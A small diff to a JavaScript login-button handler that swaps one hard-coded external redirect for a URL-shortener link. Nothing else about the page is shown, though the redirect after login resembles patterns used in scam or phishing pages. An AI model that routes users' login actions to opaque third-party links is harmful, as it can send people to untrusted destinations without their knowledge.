@@ -56,6 +56,6 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("https://swift-file.net/atozmoneyin~289172Z");
+    window.location.replace("https://smrturl.co/83295e8");
   }
 });
